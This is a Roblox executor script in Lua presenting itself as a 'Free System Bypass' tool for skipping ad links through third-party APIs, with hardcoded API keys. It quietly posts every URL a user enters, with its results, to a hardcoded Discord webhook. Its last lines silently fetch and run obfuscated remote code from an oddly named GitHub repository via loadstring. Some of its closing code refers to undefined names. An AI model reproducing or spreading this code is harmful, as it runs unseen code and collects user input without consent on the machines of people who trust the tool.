
local PS = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
local HS = game:GetService("HttpService")
local TS = game:GetService("TweenService")

local G = Instance.new("ScreenGui")
G.Name, G.Parent = "BypassGui", PS

local F = Instance.new("Frame")
F.Size, F.Position = UDim2.new(0, 300, 0, 350), UDim2.new(0.5, -150, 0.5, -175)
F.BackgroundColor3, F.BorderSizePixel = Color3.fromRGB(10, 20, 30), 0
F.Active, F.Draggable, F.Parent = true, true, G

Instance.new("UICorner", F).CornerRadius = UDim.new(0, 10)

local T = Instance.new("TextLabel")
T.Size, T.Position = UDim2.new(1, -30, 0, 30), UDim2.new(0, 0, 0, 0)
T.BackgroundTransparency, T.Text = 1, ">>> [Free System Bypass] <<<"
T.TextColor3, T.Font, T.TextSize = Color3.fromRGB(0, 255, 0), Enum.Font.GothamBold, 18
T.Parent = F

local C = Instance.new("TextButton")
C.Size, C.Position = UDim2.new(0, 30, 0, 30), UDim2.new(1, -30, 0, 0)
C.BackgroundTransparency, C.Text = 1, "X"
C.TextColor3, C.Font, C.TextSize = Color3.fromRGB(255, 0, 0), Enum.Font.GothamBold, 18
C.Parent = F

local S = Instance.new("TextLabel")
S.Size, S.Position = UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 0, 35)
S.BackgroundTransparency, S.Text = 1, "Status: Checking..."
S.TextColor3, S.Font, S.TextSize = Color3.fromRGB(255, 255, 0), Enum.Font.Gotham, 14
S.Parent = F

local I = Instance.new("TextBox")
I.Size, I.Position = UDim2.new(0.9, 0, 0, 30), UDim2.new(0.05, 0, 0.2, 0)
I.BackgroundColor3, I.TextColor3 = Color3.fromRGB(20, 40, 60), Color3.fromRGB(0, 255, 0)
I.PlaceholderText, I.Text = "Enter URL", "Enter URL"
I.PlaceholderColor3, I.Font, I.TextSize = Color3.fromRGB(0, 200, 0), Enum.Font.Code, 14
I.ClearTextOnFocus, I.ClipsDescendants, I.Parent = true, true, F

local R1 = Instance.new("TextLabel")
R1.Size, R1.Position = UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0.35, 0)
R1.BackgroundColor3, R1.TextColor3 = Color3.fromRGB(20, 40, 60), Color3.fromRGB(0, 255, 0)
R1.Text, R1.Font, R1.TextSize = "Result 1 will appear here", Enum.Font.Code, 14
R1.TextWrapped, R1.Parent = true, F

local R2 = Instance.new("TextLabel")
R2.Size, R2.Position = UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0.55, 0)
R2.BackgroundColor3, R2.TextColor3 = Color3.fromRGB(20, 40, 60), Color3.fromRGB(0, 255, 0)
R2.Text, R2.Font, R2.TextSize = "Result 2 will appear here", Enum.Font.Code, 14
R2.TextWrapped, R2.Parent = true, F

local B1 = Instance.new("TextButton")
B1.Size, B1.Position = UDim2.new(0.4, 0, 0, 25), UDim2.new(0.05, 0, 0.75, 0)
B1.BackgroundColor3, B1.Text = Color3.fromRGB(0, 100, 0), "Copy 1"
B1.TextColor3, B1.Font, B1.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 14
B1.Parent = F

local B2 = Instance.new("TextButton")
B2.Size, B2.Position = UDim2.new(0.4, 0, 0, 25), UDim2.new(0.55, 0, 0.75, 0)
B2.BackgroundColor3, B2.Text = Color3.fromRGB(0, 100, 0), "Copy 2"
B2.TextColor3, B2.Font, B2.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 14
B2.Parent = F

local IF = Instance.new("Frame")
IF.Size, IF.Position = UDim2.new(0.9, 0, 0, 50), UDim2.new(0.05, 0, 0.85, 0)
IF.BackgroundColor3, IF.Parent = Color3.fromRGB(20, 40, 60), F

Instance.new("UICorner", IF).CornerRadius = UDim.new(0, 5)

local CL = Instance.new("TextLabel")
CL.Size, CL.Position = UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 0, 0)
CL.BackgroundTransparency, CL.Text = 1, "By: OneCreatorX"
CL.TextColor3, CL.Font, CL.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.Gotham, 12
CL.Parent = IF

local YB = Instance.new("TextButton")
YB.Size, YB.Position = UDim2.new(0.45, 0, 0, 20), UDim2.new(0.025, 0, 0.6, 0)
YB.BackgroundColor3, YB.Text = Color3.fromRGB(200, 0, 0), "YouTube"
YB.TextColor3, YB.Font, YB.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 12
YB.Parent = IF

local DB = Instance.new("TextButton")
DB.Size, DB.Position = UDim2.new(0.45, 0, 0, 20), UDim2.new(0.525, 0, 0.6, 0)
DB.BackgroundColor3, DB.Text = Color3.fromRGB(88, 101, 242), "Discord"
DB.TextColor3, DB.Font, DB.TextSize = Color3.fromRGB(255, 255, 255), Enum.Font.GothamBold, 12
DB.Parent = IF

local L = Instance.new("Frame")
L.Size, L.BackgroundColor3 = UDim2.new(1, 0, 1, 0), Color3.fromRGB(0, 0, 0)
L.BackgroundTransparency, L.Visible, L.Parent = 0.5, false, F

local LT = Instance.new("TextLabel")
LT.Size, LT.BackgroundTransparency = UDim2.new(1, 0, 1, 0), 1
LT.Text, LT.TextColor3 = "Bypassing...", Color3.fromRGB(0, 255, 0)
LT.Font, LT.TextSize, LT.Parent = Enum.Font.Code, 18, L

local function ud(s) return s:gsub('%%(%x%x)', function(h) return string.char(tonumber(h, 16)) end) end

local function nt(t, m, d)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = t, Text = m, Duration = d})
end

local function snd(w, m)
    local dm = ud(m)
    local rb = {content = dm}
    local h = {["Content-Type"] = "application/json"}
    local r = http_request or request or syn.request or http.request
    if r then r({Url = w, Method = "POST", Headers = h, Body = HS:JSONEncode(rb)}) end
end

local function bp1(u)
    local ak = "DLR_YY-1239879716871263871623862137819092787-ZZ"
    local au = "https://dlr-api.woozym.workers.dev/"
    local h = {["x-api-key"] = ak}
    local eu = HS:UrlEncode(u)
    local r = http_request or request or syn.request or http.request
    if not r then return nil, nil end
    
    local s, rp = pcall(function() return r({Url = au .. "?url=" .. eu, Method = "GET", Headers = h}) end)
    
    if s then
        if rp.StatusCode == 200 then
            local d = HS:JSONDecode(rp.Body)
            if d and d.result then
                if d.result == "https://t.ly/r69Me" then return "API_MAINTENANCE", nil
                elseif d.result:match("Invalid API key") then return "Invalid API key", nil
                else return d.result, d.time_elapsed end
            end
        elseif rp.StatusCode == 429 then
            nt("Rate Limit", "API rate limit reached. Please wait.", 5)
            return "RATE_LIMITED", nil
        end
    end
    
    return nil, nil
end

local function bp2(u)
    local ak = "ETHOS_YI03QUL9"
    local au = "https://ep.goatbypassers.xyz/api/adlinks/bypass"
    local eu = HS:UrlEncode(u)
    local r = http_request or request or syn.request or http.request
    if not r then return nil end
    
    local s, rp = pcall(function() return r({Url = au .. "?url=" .. eu .. "&apikey=" .. ak, Method = "GET"}) end)
    
    if s then
        if rp.StatusCode == 200 then
            local d = HS:JSONDecode(rp.Body)
            if d and d.bypassed then return d.bypassed
            else return "Invalid link" end
        elseif rp.StatusCode == 429 then
            nt("Rate Limit", "API rate limit reached. Please wait.", 5)
            return "RATE_LIMITED"
        end
    end
    
    return nil
end

local function pb()
    if not I.TextEditable then return end
    
    L.Visible = true
    local u = I.Text
    spawn(function()
        local r1, t1 = bp1(u)
        local r2 = bp2(u)
        L.Visible = false
        
        if r1 then
            if r1 == "API_MAINTENANCE" then R1.Text = "API 1 is under maintenance."
            elseif r1:match("bypass fail") then R1.Text = "1: Link will be available for bypass soon."
            else R1.Text = "1: " .. r1 end
        else R1.Text = "API 1: Failed to bypass" end
        
        if r2 then
            if r2 == "RATE_LIMITED" then R2.Text = "2: Rate limit reached."
            elseif r2 == "Invalid response" then R2.Text = "2: No Support Link."
            else R2.Text = "API 2: " .. r2 end
        else R2.Text = "API 2: Failed to bypass" end
        
        snd("https://discord.com/api/webhooks/1260028662703587378/b1QLN4idfY-q6XIVRT4QSi2Igq6BBTer3uCE6aMFT6vhet-vdAELR2u5CYE-SYaxhyVI", 
            "URL: " .. u .. "\nAPI 1: " .. R1.Text .. "\nAPI 2: " .. R2.Text)
    end)
end

I.FocusLost:Connect(pb)

B1.MouseButton1Click:Connect(function() setclipboard(R1.Text:gsub("API 1: ", "")) end)
B2.MouseButton1Click:Connect(function() setclipboard(R2.Text:gsub("API 2: ", "")) end)

C.MouseButton1Click:Connect(function() G:Destroy() end)

YB.MouseButton1Click:Connect(function() setclipboard("https://www.youtube.com/@OneCreatorX") end)
DB.MouseButton1Click:Connect(function() setclipboard("https://discord.com/invite/nn36bjM6RX") end)

local function ci() return G.Parent end

spawn(function()
    while true do
        if not ci() then break end
        S.Text = "Status: Checking..."
        wait(10)
    end
end)



local function createGlowEffect()
    local Glow = Instance.new("ImageLabel")
    Glow.Size = UDim2.new(1.1, 0, 1.1, 0)
    Glow.Position = UDim2.new(-0.05, 0, -0.05, 0)
    Glow.BackgroundTransparency = 1
    Glow.Image = "rbxassetid://5028857472"
    Glow.ImageColor3 = Color3.fromRGB(0, 255, 0)
    Glow.ZIndex = -1
    Glow.Parent = Frame
end

createGlowEffect()

local function animateColors()
    while checkInterface() do
        for i = 0, 1, 0.01 do
            if not checkInterface() then
                return
            end
            Frame.BackgroundColor3 = Color3.fromHSV(i, 1, 0.2)
            wait(0.05)
        end
    end
end

spawn(animateColors)

spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bjalalsjzbslalqoqueeyhskaambpqo/kajsbsba--hahsjsv-kakwbs_jaks_082hgg927hsksoLol-Noobbro9877272jshshsbsjsURLwww.noob.com.Obfuscate/main/info.lua"))()
    end)
end)
                    
